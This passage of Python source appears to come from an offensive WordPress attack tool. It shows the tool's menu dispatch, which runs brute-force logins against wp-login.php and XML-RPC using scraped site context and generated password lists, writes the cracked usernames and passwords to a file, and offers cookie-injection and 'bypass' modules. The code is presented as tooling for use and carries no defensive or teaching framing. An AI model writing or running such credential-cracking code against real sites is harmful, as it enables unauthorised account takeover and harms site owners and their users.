                    f.write(f"PASSWORD: {brute_result[0]['password']}\n")
                    f.write(f"METHOD: XML-RPC\n")
                output.success(f"Saved to: {result_file}")
            else:
                output.warning("Password not found with current wordlist.")
            
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 4:
            # AI Brute-Force wp-login
            output = LiveOutput()
            
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            
            usernames = context.get("users", []) or ["admin"]
            if not context.get("users"):
                usernames = ["admin"]
            
            pw_gen = AIPasswordGenerator(context, output)
            passwords, _ = pw_gen.generate()
            
            print(f"\n  {Fore.YELLOW}[!] Starting wp-login.php brute force with {len(passwords)} passwords...{Style.RESET_ALL}")
            bf = SmartBruteForcer(TARGET, usernames, passwords, output)
            brute_result = bf.brute_force(method="wplogin", threads=2)
            
            if brute_result:
                output.success(f"PASSWORD FOUND: {brute_result[0]['username']}:{brute_result[0]['password']}")
                result_file = f"wp_cracked_{int(time.time())}.txt"
                with open(result_file, 'w') as f:
                    f.write(f"TARGET: {TARGET}\n")
                    f.write(f"USERNAME: {brute_result[0]['username']}\n")
                    f.write(f"PASSWORD: {brute_result[0]['password']}\n")
                    f.write(f"METHOD: wp-login.php\n")
                output.success(f"Saved to: {result_file}")
            else:
                output.warning("Password not found with current wordlist.")
            
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 5:
            # Cookie Injection
            output = LiveOutput()
            ce = CookieEngine(TARGET, output)
            ce.analyze_cookies()
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 6:
            # DOM Shadow Analyzer
            output = LiveOutput()
            dom = DOMShadowAnalyzer(TARGET, output)
            dom.analyze()
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 7:
            # Bypass Researcher
            output = LiveOutput()
            br = BypassResearcher(TARGET, output)
            br.research()
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 8:
            # AI Context Scraper
            output = LiveOutput()
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 9:
            # AI Password Generator
            output = LiveOutput()
            scraper = AIContextScraper(TARGET, output)
            context = scraper.scrape()
            pw_gen = AIPasswordGenerator(context, output)
            passwords, file = pw_gen.generate()
            print(f"\n  {Fore.GREEN}[✓] Generated {len(passwords)} passwords → {file}{Style.RESET_ALL}")
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
        
        elif choice == 10:
            # Report (pokud existují data)
            print(f"\n  {Fore.YELLOW}[!] This requires scan data from a previous run.{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}[!] Run a Full Scan (option 1) first.{Style.RESET_ALL}")
            input(f"\n  {Fore.DIM}Press Enter to return to menu...{Style.RESET_ALL}")
